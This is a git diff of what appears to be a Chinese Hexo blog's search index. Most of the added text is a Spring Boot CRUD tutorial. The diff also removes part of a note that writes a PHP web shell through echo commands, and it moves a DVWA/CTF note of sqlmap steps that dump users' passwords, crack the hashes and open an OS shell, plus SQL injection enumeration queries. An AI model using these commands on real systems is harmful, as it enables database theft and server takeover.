-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \)\; &gt;&gt;<span class="hljs-number">1</span> 
-?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre>
-
-<p>之后访问1.php提交参数，获取想要的内容。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>cmd</tag>
-      </tags>
   </entry>
   <entry>
     <title>redis</title>
@@ -3530,35 +3530,6 @@ cmdline.execute(<span class="hljs-string">&quot;scrapy crawl 爬虫名字&quot;<
       </categories>
       <tags>
         <tag>spider</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlmap</title>
-    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
-
-<p>第一步:</p>
-<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
-<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
-<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
-<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
-<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
-//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
-<p>第六步:</p>
-<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
-<p>group by *</p>
-<p>利用内置函数暴数据库信息</p>
-<p>version() 查看数据库版本</p>
-<p>database() 查看当前数据库名</p>
-<p>user() 查看当前用户</p>
-<p>查看表：</p>
-<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
-<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -4173,6 +4144,35 @@ flag = <span class="hljs-string">&quot;&quot;</span>
 print(flag)</code></pre>
 
 ]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlmap</title>
+    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
+
+<p>第一步:</p>
+<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
+<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
+<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
+<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
+<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
+//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
+<p>第六步:</p>
+<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
+<p>group by *</p>
+<p>利用内置函数暴数据库信息</p>
+<p>version() 查看数据库版本</p>
+<p>database() 查看当前数据库名</p>
+<p>user() 查看当前用户</p>
+<p>查看表：</p>
+<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
+<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
       <categories>
         <category>ctf</category>
       </categories>
@@ -6385,6 +6385,566 @@ cursor.close()</code></pre>
       </categories>
       <tags>
         <tag>朴素贝叶斯</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>springboot_demo</title>
+    <url>/2022/04/17/springboot-demo/</url>
+    <content><![CDATA[<h1 id="springboot-demo"><a href="#springboot-demo" class="headerlink" title="springboot demo"></a>springboot demo</h1><p>使用springboot整合SSMP</p>
+<h2 id="1-项目需求"><a href="#1-项目需求" class="headerlink" title="1.项目需求"></a>1.项目需求</h2><p>项目最终实现的页面</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417232613669.png" alt="image-20220417232613669"></p>
+<p>​    整体案例中需要采用的技术如下：</p>
+<blockquote>
+<ol>
+<li>Dao开发————整合MyBatisPlus，制作数据层测试</li>
+<li>Service开发————基于MyBatisPlus进行增量开发，制作业务层测试类</li>
+<li>Controller开发————基于Restful开发，使用PostMan测试接口功能</li>
+<li>Controller开发————前后端开发协议制作</li>
+<li>页面开发————基于VUE+ElementUI制作，前后端联调，页面数据处理，页面消息处理<ul>
+<li>列表</li>
+<li>新增</li>
+<li>修改</li>
+<li>删除</li>
+<li>分页</li>
+<li>查询</li>
+</ul>
+</li>
+<li>项目异常处理</li>
+<li>按条件查询————页面功能调整、Controller修正功能、Service修正功能</li>
+</ol>
+</blockquote>
+<h2 id="2-创建springboot的web项目"><a href="#2-创建springboot的web项目" class="headerlink" title="2.创建springboot的web项目"></a>2.创建springboot的web项目</h2><h3 id="新建模块"><a href="#新建模块" class="headerlink" title="新建模块"></a>新建模块</h3><p><code>File-&gt;new-&gt;module</code></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214418622.png" alt="image-20220417214418622"></p>
+<p>这里没什么需要改的，只需要修改使用的java版本</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214706594.png" alt="image-20220417214706594"></p>
+<p>选择所需要的依赖，选择后springboot就可以自动导入相关坐标，无需手动导入</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214851951.png" alt="image-20220417214851951"></p>
+<p>==注意将配置文件改为yml类型==</p>
+<p><strong>application.yml</strong></p>
+<pre><code class="hljs yaml"><span class="hljs-comment"># 修改配置将tomcat的端口改为80</span>
+<span class="hljs-attr">server:</span> 
+	<span class="hljs-attr">port:</span> <span class="hljs-number">80</span></code></pre>
+
+
+
+<h2 id="3-开发流程"><a href="#3-开发流程" class="headerlink" title="3.开发流程"></a>3.开发流程</h2><h3 id="实体类开发"><a href="#实体类开发" class="headerlink" title="实体类开发"></a>实体类开发</h3><p>数据库资源</p>
+<pre><code class="hljs sql"><span class="hljs-comment">-- ----------------------------</span>
+<span class="hljs-comment">-- Table structure for tbl_book</span>
+<span class="hljs-comment">-- ----------------------------</span>
+<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `tbl_book`;
+<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `tbl_book`  (
+  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
+  `type` <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
+  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
+  `description` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
+  <span class="hljs-keyword">PRIMARY</span> KEY (`id`) <span class="hljs-keyword">USING</span> BTREE
+) ENGINE <span class="hljs-operator">=</span> InnoDB AUTO_INCREMENT <span class="hljs-operator">=</span> <span class="hljs-number">51</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> <span class="hljs-operator">=</span> utf8 <span class="hljs-keyword">COLLATE</span> <span class="hljs-operator">=</span> utf8_general_ci ROW_FORMAT <span class="hljs-operator">=</span> <span class="hljs-keyword">Dynamic</span>;
+
+<span class="hljs-comment">-- ----------------------------</span>
+<span class="hljs-comment">-- Records of tbl_book</span>
+<span class="hljs-comment">-- ----------------------------</span>
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring实战 第5版&#x27;</span>, <span class="hljs-string">&#x27;Spring入门经典教程，深入理解Spring原理技术内幕&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring 5核心原理与30个类手写实战&#x27;</span>, <span class="hljs-string">&#x27;十年沉淀之作，手写Spring精华思想&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring 5 设计模式&#x27;</span>, <span class="hljs-string">&#x27;深入Spring源码剖析Spring源码中蕴含的10大设计模式&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring MVC+MyBatis开发从入门到项目实战&#x27;</span>, <span class="hljs-string">&#x27;全方位解析面向Web应用的轻量级框架，带你成为Spring MVC开发高手&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;轻量级Java Web企业应用实战&#x27;</span>, <span class="hljs-string">&#x27;源码级剖析Spring框架，适合已掌握Java基础的读者&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Java核心技术 卷I 基础知识（原书第11版）&#x27;</span>, <span class="hljs-string">&#x27;Core Java 第11版，Jolt大奖获奖作品，针对Java SE9、10、11全面更新&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;深入理解Java虚拟机&#x27;</span>, <span class="hljs-string">&#x27;5个维度全面剖析JVM，大厂面试知识点全覆盖&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Java编程思想（第4版）&#x27;</span>, <span class="hljs-string">&#x27;Java学习必读经典,殿堂级著作！赢得了全球程序员的广泛赞誉&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;零基础学Java（全彩版）&#x27;</span>, <span class="hljs-string">&#x27;零基础自学编程的入门图书，由浅入深，详解Java语言的编程思想和核心技术&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;市场营销&#x27;</span>, <span class="hljs-string">&#x27;直播就该这么做：主播高效沟通实战指南&#x27;</span>, <span class="hljs-string">&#x27;李子柒、李佳琦、薇娅成长为网红的秘密都在书中&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">11</span>, <span class="hljs-string">&#x27;市场营销&#x27;</span>, <span class="hljs-string">&#x27;直播销讲实战一本通&#x27;</span>, <span class="hljs-string">&#x27;和秋叶一起学系列网络营销书籍&#x27;</span>);
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;市场营销&#x27;</span>, <span class="hljs-string">&#x27;直播带货：淘宝、天猫直播从新手到高手&#x27;</span>, <span class="hljs-string">&#x27;一本教你如何玩转直播的书，10堂课轻松实现带货月入3W+&#x27;</span>);</code></pre>
+
+<p><code>tbl_book</code>对应的实体类如下</p>
+<pre><code class="hljs java"><span class="hljs-keyword">import</span> lombok.Data;
+<span class="hljs-meta">@Data</span>
+<span class="hljs-comment">// Data注解可以可以完成所有属性的setter getter toString，equals，hashCode方法</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span> </span>&#123;
+    <span class="hljs-keyword">private</span> Integer id;
+    <span class="hljs-keyword">private</span> String type;
+    <span class="hljs-keyword">private</span> String name;
+    <span class="hljs-keyword">private</span> String description;
+&#125;</code></pre>
+
+<p>为了方便开发使用<code>lombok</code>注解，在pom.xml添加坐标</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
+    <span class="hljs-comment">&lt;!--lombok--&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre>
+
+
+
+<h3 id="数据层开发-CRUD"><a href="#数据层开发-CRUD" class="headerlink" title="数据层开发-CRUD"></a>数据层开发-CRUD</h3><h4 id="1-导入mybatisplus、数据源、mysql驱动的坐标"><a href="#1-导入mybatisplus、数据源、mysql驱动的坐标" class="headerlink" title="(1) 导入mybatisplus、数据源、mysql驱动的坐标"></a>(1) 导入mybatisplus、数据源、mysql驱动的坐标</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
+
+<h4 id="2-在application-xml中配置数据源信息"><a href="#2-在application-xml中配置数据源信息" class="headerlink" title="(2)在application.xml中配置数据源信息"></a>(2)在application.xml中配置数据源信息</h4><pre><code class="hljs yaml">
+<span class="hljs-attr">spring:</span>
+  <span class="hljs-attr">datasource:</span>
+    <span class="hljs-attr">druid:</span>
+      <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
+      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/javastudy?serverTimezone=UTC</span>
+      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
+      <span class="hljs-attr">password:</span> <span class="hljs-string">root</span></code></pre>
+
+<p>==若连接数据库出现时区错误时可以加上参数?serverTimezone=UTC==</p>
+<h4 id="3-使用MyBatisPlus的标准通用接口BaseMapper加速开发"><a href="#3-使用MyBatisPlus的标准通用接口BaseMapper加速开发" class="headerlink" title="(3)使用MyBatisPlus的标准通用接口BaseMapper加速开发"></a>(3)使用MyBatisPlus的标准通用接口BaseMapper加速开发</h4><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">BookDao</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseMapper</span>&lt;<span class="hljs-title">Book</span>&gt; </span>&#123;
+&#125;</code></pre>
+
+<p>==注意==</p>
+<p>对数据库操作时需要指定数据表的前缀，并设置主键增加的策略，这里使用自增</p>
+<pre><code class="hljs yaml"><span class="hljs-attr">mybatis-plus:</span>
+  <span class="hljs-attr">global-config:</span>
+    <span class="hljs-attr">db-config:</span>
+      <span class="hljs-attr">table-prefix:</span> <span class="hljs-string">tbl_</span>		<span class="hljs-comment">#设置表名通用前缀</span>
+      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>				<span class="hljs-comment">#设置主键id字段的生成策略为参照数据库设定的策略，当前数据库设置id生成策略为自增</span></code></pre>
+
+<p>设置mybatisPlus的日志显示格式</p>
+<p>在进行数据层测试的时候，因为基础的CRUD操作均由MyBatisPlus给我们提供了，所以就出现了一个局面，开发者不需要书写SQL语句了，这样程序运行的时候总有一种感觉，一切的一切都是黑盒的，作为开发者我们啥也不知道就完了。如果程序正常运行还好，如果报错了，这个时候就很崩溃，你甚至都不知道从何下手，因为传递参数、封装SQL语句这些操作完全不是你开发出来的，所以查看执行期运行的SQL语句就成为当务之急。</p>
+<p>可以添加日志配置</p>
+<pre><code class="hljs yaml"><span class="hljs-attr">mybatis-plus:</span>
+  <span class="hljs-attr">global-config:</span>
+    <span class="hljs-attr">db-config:</span>
+      <span class="hljs-attr">table-prefix:</span> <span class="hljs-string">tbl_</span>
+      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>
+  <span class="hljs-attr">configuration:</span> <span class="hljs-comment"># 设置mybatisplus的日志为标准输入格式 可以显示执行的sql语句、携带的参数与查询结果</span>
+    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span></code></pre>
+
+<h3 id="数据层开发-分页功能"><a href="#数据层开发-分页功能" class="headerlink" title="数据层开发-分页功能"></a>数据层开发-分页功能</h3><p>Mybatis-plus中已经实现了分页功能的API，具体使用方法如下</p>
+<ul>
+<li>创建Page对象，利用构造方法实例化所需的参数currentPage，pageSize</li>
+<li>使用Mapper.selectPage()使用分页查询功能</li>
+</ul>
+<pre><code class="hljs java">IPage page = <span class="hljs-keyword">new</span> Page(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);
+IPage page = bookDao.selectPage(page, <span class="hljs-keyword">null</span>);</code></pre>
+
+<p>使用分页查询返回的结果仍是Page类型，其中包含多条数据，并且使用返回的结果可以获取到分页的详细信息，包括当前页，总记录数，当前页记录数，前一页等</p>
+<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetPage</span><span class="hljs-params">()</span></span>&#123;
+    IPage page = <span class="hljs-keyword">new</span> Page(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);
+    bookDao.selectPage(page, <span class="hljs-keyword">null</span>);
+    System.out.println(page.getCurrent());		<span class="hljs-comment">//当前页码值</span>
+    System.out.println(page.getSize());			<span class="hljs-comment">//每页显示数</span>
+    System.out.println(page.getTotal());		<span class="hljs-comment">//数据总量</span>
+    System.out.println(page.getPages());		<span class="hljs-comment">//总页数</span>
+    System.out.println(page.getRecords());		<span class="hljs-comment">//详细数据</span>
+&#125;</code></pre>
+
+<p>但是在使用分页功能时需要设置一个拦截器，基础操作中有查询全部的功能，而在这个基础上只需要升级一下（PLUS）就可以得到分页操作。所以MyBatisPlus将分页操作做成了一个开关，你用分页功能就把开关开启，不用就不需要开启这个开关。而我们现在没有开启这个开关，所以分页操作是没有的。这个开关是通过MyBatisPlus的拦截器的形式存在的。</p>
+<pre><code class="hljs java"><span class="hljs-meta">@Configuration</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MPConfig</span> </span>&#123;
+    <span class="hljs-meta">@Bean</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title">mybatisPlusInterceptor</span><span class="hljs-params">()</span></span>&#123;
+        MybatisPlusInterceptor interceptor = <span class="hljs-keyword">new</span> MybatisPlusInterceptor();
+        interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> PaginationInnerInterceptor());
+        
+       <span class="hljs-comment">// 当需要其他的拦截器时继续addInnerInterceptor即可</span>
+       <span class="hljs-comment">// 如果后期开发其他功能，需要添加全新的拦截器，按照第二行的格式继续add进去新的拦截器就可以了。</span>
+        <span class="hljs-keyword">return</span> interceptor;
+    &#125;
+&#125;</code></pre>
+
+
+
+<h3 id="数据层开发-条件查询"><a href="#数据层开发-条件查询" class="headerlink" title="数据层开发-条件查询"></a>数据层开发-条件查询</h3><p>MyBatisPlus将这些操作都制作成API接口，调用一个又一个的方法就可以实现各种条件的拼装。使用方法如下</p>
+<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetBy</span><span class="hljs-params">()</span></span>&#123;
+    QueryWrapper&lt;Book&gt; qw = <span class="hljs-keyword">new</span> QueryWrapper&lt;&gt;();
+    qw.like(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;Spring&quot;</span>);
+    bookDao.selectList(qw);
+&#125;</code></pre>
+
+<p>其中第一句QueryWrapper对象是一个用于封装查询条件的对象，该对象可以动态使用API调用的方法添加条件，最终转化成对应的SQL语句。第二句就是一个条件了，需要什么条件，使用QueryWapper对象直接调用对应操作即可。上述代码中执行的SQL语句为<code>select * from tbl_book where name like &#39;%spring%&#39;</code>，MP自动对查询条件进行处理，省去了手动处理的一步。</p>
+<p>MyBatisPlus针对字段检查进行了功能升级，全面支持Lambda表达式，就有了下面这组API。由QueryWrapper对象升级为LambdaQueryWrapper对象，其使用方法如下：</p>
+<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetBy2</span><span class="hljs-params">()</span></span>&#123;
+    String name = <span class="hljs-string">&quot;1&quot;</span>;
+    LambdaQueryWrapper&lt;Book&gt; lqw = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;Book&gt;();
+    lqw.like(Book::getName,name);
+    bookDao.selectList(lqw);
+&#125;</code></pre>
+
+<p>为了便于开发者动态拼写SQL，防止将null数据作为条件使用，MyBatisPlus还提供了动态拼装SQL的快捷书写方式。</p>
+<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetBy2</span><span class="hljs-params">()</span></span>&#123;
+    String name = <span class="hljs-string">&quot;1&quot;</span>;
+    LambdaQueryWrapper&lt;Book&gt; lqw = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;Book&gt;();
+    <span class="hljs-comment">//if(name != null) lqw.like(Book::getName,name);		//方式一：JAVA代码控制</span>
+    lqw.like(name != <span class="hljs-keyword">null</span>,Book::getName,name);				<span class="hljs-comment">//方式二：API接口提供控制开关</span>
+    bookDao.selectList(lqw);
+&#125;</code></pre>
+
+
+
+<h3 id="业务层开发"><a href="#业务层开发" class="headerlink" title="业务层开发"></a>业务层开发</h3><p>定义业务层的接口<code>BookService</code></p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.service;
+
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
+<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
+
+<span class="hljs-keyword">import</span> java.util.List;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">BookService</span> </span>&#123;
+    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">save</span><span class="hljs-params">(Book book)</span></span>;
+    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">update</span><span class="hljs-params">(Book book)</span></span>;
+    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(Integer id)</span></span>;
+
+    <span class="hljs-function">List&lt;Book&gt; <span class="hljs-title">getAll</span><span class="hljs-params">()</span></span>;
+    <span class="hljs-function">Book <span class="hljs-title">getById</span><span class="hljs-params">(Integer id)</span></span>;
+
+    <span class="hljs-function">IPage&lt;Book&gt; <span class="hljs-title">getPage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span></span>;
+
+&#125;</code></pre>
+
+<p>业务层接口的实现类</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.service.impl;
+
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
+<span class="hljs-keyword">import</span> com.sunzy.dao.BookDao;
+<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
+<span class="hljs-keyword">import</span> com.sunzy.service.BookService;
+<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
+<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
+
+<span class="hljs-keyword">import</span> java.util.List;
+
+<span class="hljs-comment">// 注册为数据逻辑层的bean</span>
+<span class="hljs-meta">@Service</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookServiceImpl2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">BookService</span> </span>&#123;
+
+    <span class="hljs-meta">@Autowired</span>
+    <span class="hljs-keyword">private</span> BookDao bookDao;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">save</span><span class="hljs-params">(Book book)</span> </span>&#123;
+        <span class="hljs-keyword">return</span> bookDao.insert(book) &gt; <span class="hljs-number">0</span>;
+    &#125;
+
